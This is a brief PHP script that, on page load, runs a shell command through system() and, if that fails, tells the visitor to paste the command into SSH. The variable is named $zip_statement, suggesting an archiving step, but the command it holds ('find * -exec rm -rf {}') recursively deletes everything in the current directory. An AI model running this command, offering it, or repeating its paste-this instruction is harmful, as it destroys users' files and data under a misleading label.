<?php
ini_set('max_execution_time', 300);
error_reporting(E_ALL);

$zip_statement = 'find * 2>&1 -exec rm -rf {} \;';
if (function_exists('system')) {
    echo '<pre>';
    system($zip_statement);
} else {
    echo '<code>system()</code> is not supported. Copy and paste the following through SSH:';
    echo "<pre>$zip_statement\n\n</pre>";
}
?>